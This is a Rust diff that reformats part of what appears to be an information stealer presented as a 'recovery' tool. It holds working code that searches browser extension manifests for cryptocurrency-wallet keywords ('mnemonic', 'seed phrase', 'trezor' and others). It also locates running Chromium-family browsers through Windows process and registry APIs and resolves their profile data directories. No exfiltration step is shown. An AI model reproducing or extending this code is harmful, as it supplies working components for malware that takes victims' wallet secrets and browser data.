@@ -448,14 +448,23 @@ impl BrowserExtensionTask {
                 if let Ok(content) = fs::read_to_string(&manifest_path).await {
                     let content_low = content.to_lowercase();
                     let keywords = [
-                        "wallet", "crypto", "mnemonic", "bip39", "bitcoin", "ethereum", 
-                        "solana", "passphrase", "seed phrase", "ledger", "trezor"
+                        "wallet",
+                        "crypto",
+                        "mnemonic",
+                        "bip39",
+                        "bitcoin",
+                        "ethereum",
+                        "solana",
+                        "passphrase",
+                        "seed phrase",
+                        "ledger",
+                        "trezor",
                     ];
-                    
+
                     if keywords.iter().any(|&k| content_low.contains(k)) {
                         if let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) {
                             if let Some(name) = json.get("name").and_then(|v| v.as_str()) {
-                                 return Some(name.to_string());
+                                return Some(name.to_string());
                             }
                         }
                         return Some("UnknownCryptoExtension".to_string());
@@ -514,19 +523,30 @@ pub async fn default_browser_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn Recover
 
 fn find_running_browsers(ctx: &RecoveryContext) -> Vec<(BrowserName, PathBuf)> {
     let mut results = Vec::new();
-    
+
     let browsers = [
-        BrowserName::Chrome, BrowserName::Edge, BrowserName::Brave, BrowserName::Opera,
-        BrowserName::Vivaldi, BrowserName::Yandex, BrowserName::ThreeSixty, BrowserName::QQ,
-        BrowserName::CocCoc, BrowserName::NaverWhale, BrowserName::Arc, BrowserName::Chromium
+        BrowserName::Chrome,
+        BrowserName::Edge,
+        BrowserName::Brave,
+        BrowserName::Opera,
+        BrowserName::Vivaldi,
+        BrowserName::Yandex,
+        BrowserName::ThreeSixty,
+        BrowserName::QQ,
+        BrowserName::CocCoc,
+        BrowserName::NaverWhale,
+        BrowserName::Arc,
+        BrowserName::Chromium,
     ];
 
     for browser in browsers {
         let pid = super::lockedfile::proc::find_by_name(browser.process_name());
         if pid != 0 {
-            use windows::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION};
-            use windows::Win32::System::ProcessStatus::K32GetModuleFileNameExW;
             use windows::Win32::Foundation::CloseHandle;
+            use windows::Win32::System::ProcessStatus::K32GetModuleFileNameExW;
+            use windows::Win32::System::Threading::{
+                OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION,
+            };
 
             unsafe {
                 if let Ok(h_proc) = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid) {
@@ -535,7 +555,8 @@ fn find_running_browsers(ctx: &RecoveryContext) -> Vec<(BrowserName, PathBuf)> {
                     let _ = CloseHandle(h_proc);
 
                     if len > 0 {
-                        let exe_path = PathBuf::from(String::from_utf16_lossy(&path_buf[..len as usize]));
+                        let exe_path =
+                            PathBuf::from(String::from_utf16_lossy(&path_buf[..len as usize]));
                         if let Some(data_root) = resolve_data_root(ctx, browser, &exe_path) {
                             if data_root.exists() {
                                 results.push((browser, data_root));
@@ -546,7 +567,7 @@ fn find_running_browsers(ctx: &RecoveryContext) -> Vec<(BrowserName, PathBuf)> {
             }
         }
     }
-    
+
     results
 }
 
@@ -560,11 +581,18 @@ fn find_registry_browsers(ctx: &RecoveryContext) -> Vec<(BrowserName, PathBuf)> 
                 if let Ok(browser_key) = key.open_subkey(&name) {
                     if let Ok(command_key) = browser_key.open_subkey("shell\\open\\command") {
                         if let Ok(exe_path_raw) = command_key.get_value::<String, _>("") {
-                            let exe_path = exe_path_raw.trim_matches('"').split(".exe").next().map(|s| format!("{}.exe", s)).unwrap_or(exe_path_raw);
+                            let exe_path = exe_path_raw
+                                .trim_matches('"')
+                                .split(".exe")
+                                .next()
+                                .map(|s| format!("{}.exe", s))
+                                .unwrap_or(exe_path_raw);
                             let exe_path = PathBuf::from(exe_path);
-                            
+
                             if let Some(browser_name) = match_browser_by_path(&exe_path) {
-                                if let Some(data_root) = resolve_data_root(ctx, browser_name, &exe_path) {
+                                if let Some(data_root) =
+                                    resolve_data_root(ctx, browser_name, &exe_path)
+                                {
                                     if data_root.exists() {
                                         results.push((browser_name, data_root));
                                     }
@@ -581,24 +609,45 @@ fn find_registry_browsers(ctx: &RecoveryContext) -> Vec<(BrowserName, PathBuf)> 
 
 fn match_browser_by_path(path: &Path) -> Option<BrowserName> {
     let path_str = path.to_string_lossy().to_lowercase();
-    if path_str.contains("chrome.exe") { Some(BrowserName::Chrome) }
-    else if path_str.contains("msedge.exe") { Some(BrowserName::Edge) }
-    else if path_str.contains("brave.exe") { Some(BrowserName::Brave) }
-    else if path_str.contains("opera.exe") || path_str.contains("opera gx") { Some(BrowserName::Opera) }
-    else if path_str.contains("vivaldi.exe") { Some(BrowserName::Vivaldi) }
-    else if path_str.contains("browser.exe") && path_str.contains("yandex") { Some(BrowserName::Yandex) }
-    else if path_str.contains("360chrome.exe") { Some(BrowserName::ThreeSixty) }
-    else if path_str.contains("qqbrowser.exe") { Some(BrowserName::QQ) }
-    else if path_str.contains("browser.exe") && path_str.contains("coccoc") { Some(BrowserName::CocCoc) }
-    else if path_str.contains("whale.exe") { Some(BrowserName::NaverWhale) }
-    else if path_str.contains("arc.exe") { Some(BrowserName::Arc) }
-    else if path_str.contains("chromium.exe") { Some(BrowserName::Chromium) }
-    else { None }
+    if path_str.contains("chrome.exe") {
+        Some(BrowserName::Chrome)
+    } else if path_str.contains("msedge.exe") {
+        Some(BrowserName::Edge)
+    } else if path_str.contains("brave.exe") {
+        Some(BrowserName::Brave)
+    } else if path_str.contains("opera.exe") || path_str.contains("opera gx") {
+        Some(BrowserName::Opera)
+    } else if path_str.contains("vivaldi.exe") {
+        Some(BrowserName::Vivaldi)
+    } else if path_str.contains("browser.exe") && path_str.contains("yandex") {
+        Some(BrowserName::Yandex)
+    } else if path_str.contains("360chrome.exe") {
+        Some(BrowserName::ThreeSixty)
+    } else if path_str.contains("qqbrowser.exe") {
+        Some(BrowserName::QQ)
+    } else if path_str.contains("browser.exe") && path_str.contains("coccoc") {
+        Some(BrowserName::CocCoc)
+    } else if path_str.contains("whale.exe") {
+        Some(BrowserName::NaverWhale)
+    } else if path_str.contains("arc.exe") {
+        Some(BrowserName::Arc)
+    } else if path_str.contains("chromium.exe") {
+        Some(BrowserName::Chromium)
+    } else {
+        None
+    }
 }
 
-fn resolve_data_root(ctx: &RecoveryContext, browser: BrowserName, _exe_path: &Path) -> Option<PathBuf> {
+fn resolve_data_root(
+    ctx: &RecoveryContext,
+    browser: BrowserName,
+    _exe_path: &Path,
+) -> Option<PathBuf> {
     let roots = browser_data_roots(ctx);
-    roots.into_iter().find(|(b, _)| *b as usize == browser as usize).map(|(_, p)| p)
+    roots
+        .into_iter()
+        .find(|(b, _)| *b as usize == browser as usize)
+        .map(|(_, p)| p)
 }
 
 pub fn browser_data_roots(ctx: &RecoveryContext) -> Vec<(BrowserName, PathBuf)> {
